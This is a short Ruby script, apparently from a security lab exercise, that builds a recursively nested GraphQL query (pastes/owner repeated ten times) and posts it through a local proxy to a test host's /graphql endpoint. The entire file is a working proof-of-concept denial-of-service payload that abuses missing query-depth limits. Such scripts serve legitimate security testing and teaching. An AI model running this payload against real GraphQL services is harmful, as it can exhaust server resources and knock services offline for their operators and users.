require 'httpx'

nesting_level = 10
recursion_pattern = 'pastes{owner{'
fields = 'name'
payload = recursion_pattern * nesting_level + fields + '}}' * nesting_level

data = { 'query' => "query{#{payload}}"}

HTTPX
  .plugin(:proxy)
  .with_proxy(uri: 'http://127.0.0.1:8080')
  .with(timeout: { operation_timeout: 120 })
  .post('http://noraj.test:5013/graphql', json: data)